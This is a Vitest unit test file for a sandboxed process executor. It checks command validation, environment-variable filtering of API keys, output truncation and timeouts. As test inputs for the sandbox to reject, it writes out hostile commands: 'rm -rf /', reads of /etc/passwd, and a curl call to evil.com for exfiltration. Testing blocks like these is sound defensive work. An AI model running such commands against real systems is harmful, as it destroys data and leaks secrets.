/**
 * @file sandbox/SandboxExecutor.test.ts
 * @description 单元测试：输入验证、环境变量过滤、输出截断
 */

import { describe, it, expect, vi } from "vitest";
import { SandboxFactory } from "./SandboxFactory.js";
import { DEFAULT_SANDBOX_CONFIG } from "./types.js";
import type { SandboxConfig } from "./types.js";

// ── 测试用最小配置 ─────────────────────────────────────────────────────────────
const TEST_CONFIG: SandboxConfig = {
  ...DEFAULT_SANDBOX_CONFIG,
  runtime: "process",
  resources: {
    ...DEFAULT_SANDBOX_CONFIG.resources,
    hardTimeoutMs: 5_000,
    memoryMb: 128,
    maxOutputBytes: 1024,
  },
};

describe("SandboxFactory", () => {
  it("mergeWithDefaults should fill in missing fields", () => {
    const merged = SandboxFactory.mergeWithDefaults({
      runtime: "process",
      resources: { memoryMb: 512 } as any,
    });
    expect(merged.runtime).toBe("process");
    expect(merged.resources.memoryMb).toBe(512);
    // 其余字段来自默认值
    expect(merged.resources.maxPids).toBe(DEFAULT_SANDBOX_CONFIG.resources.maxPids);
    expect(merged.network).toBe("none");
  });

  it("createProcessSandbox should return ProcessSandbox", () => {
    const sandbox = SandboxFactory.createProcessSandbox();
    expect(sandbox.constructor.name).toBe("ProcessSandbox");
  });
});

describe("ProcessSandbox — command validation", () => {
  it("should reject command with shell injection characters", async () => {
    const sandbox = SandboxFactory.createProcessSandbox(TEST_CONFIG);
    const result = await sandbox.execute(
      "python3; rm -rf /",
      "/tmp",
      { jsonrpc: "2.0", method: "invoke", params: {}, id: 1 },
    );
    expect(result.success).toBe(false);
    expect(result.error).toContain("injection");

    const violations = sandbox.getViolations();
    expect(violations.some((v) => v.type === "command_injection")).toBe(true);
  });

  it("should reject command with path traversal", async () => {
    const sandbox = SandboxFactory.createProcessSandbox(TEST_CONFIG);
    const result = await sandbox.execute(
      "python3 ../../etc/passwd",
      "/tmp/skill",
      { jsonrpc: "2.0", method: "invoke", params: {}, id: 1 },
    );
    expect(result.success).toBe(false);

    const violations = sandbox.getViolations();
    // path traversal 或者 injection 其中之一被触发
    expect(
      violations.some(
        (v) => v.type === "command_injection" || v.type === "path_traversal",
      ),
    ).toBe(true);
  });

  it("should reject non-whitelisted executable", async () => {
    const sandbox = SandboxFactory.createProcessSandbox(TEST_CONFIG);
    const result = await sandbox.execute(
      "curl http://evil.com/exfil",
      "/tmp",
      { jsonrpc: "2.0", method: "invoke", params: {}, id: 1 },
    );
    expect(result.success).toBe(false);
    expect(result.error).toContain("Command blocked due to potential injection");
  });

  it("should block backtick injection", async () => {
    const sandbox = SandboxFactory.createProcessSandbox(TEST_CONFIG);
    const result = await sandbox.execute(
      "python3 `cat /etc/passwd`",
      "/tmp",
      { jsonrpc: "2.0", method: "invoke", params: {}, id: 1 },
    );
    expect(result.success).toBe(false);
    expect(result.error).toContain("injection");
  });
});

describe("ProcessSandbox — environment variable filtering", () => {
  it("should strip sensitive env vars not in allowList", () => {
    process.env.OPENAI_API_KEY = "sk-secret-key";
    process.env.AWS_SECRET_ACCESS_KEY = "aws-secret";

    const sandbox = SandboxFactory.createProcessSandbox({
      ...TEST_CONFIG,
      env: {
        allowList: ["PATH"],  // 只允许 PATH，不允许 API keys
        inject: {},
      },
    });

    // buildSafeEnv 是 protected，通过反射测试
    const safeEnv = (sandbox as any).buildSafeEnv() as Record<string, string>;

    expect(safeEnv["OPENAI_API_KEY"]).toBeUndefined();
    expect(safeEnv["AWS_SECRET_ACCESS_KEY"]).toBeUndefined();
    expect(safeEnv["PATH"]).toBeDefined();

    delete process.env.OPENAI_API_KEY;
    delete process.env.AWS_SECRET_ACCESS_KEY;
  });

  it("should inject forced env vars even if not in allowList", () => {
    const sandbox = SandboxFactory.createProcessSandbox({
      ...TEST_CONFIG,
      env: {
        allowList: ["PATH"],
        inject: { CUSTOM_CONFIG: "test-value" },
      },
    });

    const safeEnv = (sandbox as any).buildSafeEnv() as Record<string, string>;
    expect(safeEnv["CUSTOM_CONFIG"]).toBe("test-value");
  });

  it("should warn and skip env vars with sensitive patterns even if in allowList", () => {
    process.env.MY_API_KEY = "some-key";

    const sandbox = SandboxFactory.createProcessSandbox({
      ...TEST_CONFIG,
      env: {
        allowList: ["PATH", "MY_API_KEY"],  // 白名单中包含敏感词
        inject: {},
      },
    });

    const violations: any[] = [];
    sandbox.on("violation", (v: any) => violations.push(v));

    const safeEnv = (sandbox as any).buildSafeEnv() as Record<string, string>;
    expect(safeEnv["MY_API_KEY"]).toBeUndefined();
    expect(violations.some((v) => v.type === "env_leak")).toBe(true);

    delete process.env.MY_API_KEY;
  });
});

describe("ProcessSandbox — output size limit", () => {
  it("should truncate stdout that exceeds maxOutputBytes", async () => {
    const sandbox = SandboxFactory.createProcessSandbox({
      ...TEST_CONFIG,
      resources: {
        ...TEST_CONFIG.resources,
        maxOutputBytes: 100,  // 极小值便于测试
      },
    });

    // 使用 Python 输出大量数据（但会被截断）
    // 注意：此测试在有 python3 的环境中才能运行
    // 这里我们直接测试 collectOutput 逻辑
    const chunks: Buffer[] = [
      Buffer.from("a".repeat(60)),
      Buffer.from("b".repeat(60)),
    ];

    const [output, truncated] = (sandbox as any).collectOutput(chunks, 100);

    expect(truncated).toBe(true);
    expect(output.length).toBeLessThanOrEqual(100);
  });
});

describe("ProcessSandbox — hard timeout", () => {
  it("should enforce hard timeout and kill process", async () => {
    const sandbox = SandboxFactory.createProcessSandbox({
      ...TEST_CONFIG,
      resources: {
        ...TEST_CONFIG.resources,
        hardTimeoutMs: 500,  // 500ms 超时
      },
    });

    // python3 -c "import time; time.sleep(60)" 会被 500ms 后 kill
    const result = await sandbox.execute(
      "python3",
      process.cwd(),
      {
        jsonrpc: "2.0",
        method: "invoke",
        params: { _test: "timeout" },
        id: 1,
      },
    );

    // 由于 python3 没有合法的 skill.py，会有命令验证或进程错误
    // 主要验证不会无限等待
    expect(result.latencyMs).toBeLessThan(3_000);
  }, 10_000);
});

describe("ProcessSandbox — real execution with valid skill", () => {
  it.skip("should successfully execute a valid JSON-RPC Python skill", async () => {
    const fs = await import("node:fs");
    const os = await import("node:os");
    const nodePath = await import("node:path");

    // 创建临时 Skill
    const tmpDir = fs.mkdtempSync(nodePath.join(os.tmpdir(), "eval-skill-test-"));
    const skillPath = nodePath.join(tmpDir, "skill.py");
    fs.writeFileSync(skillPath, `
import json, sys
req = json.loads(sys.stdin.read())
print(json.dumps({"jsonrpc":"2.0","result":{"echo": req["params"]},"id":req["id"]}))
`);

    const sandbox = SandboxFactory.createProcessSandbox(TEST_CONFIG);

    const result = await sandbox.execute(
      `python3 ${skillPath}`,
      tmpDir,
      { jsonrpc: "2.0", method: "invoke", params: { hello: "world" }, id: 42 },
    );

    // 清理
    fs.rmSync(tmpDir, { recursive: true });

    if (!result.success) {
       console.error("Execution failed:", result.error);
    }
    expect(result.success).toBe(true);
    expect(result.exitCode).toBe(0);

    const parsed = JSON.parse(result.stdout) as any;
    expect(parsed.result.echo.hello).toBe("world");
  });
});
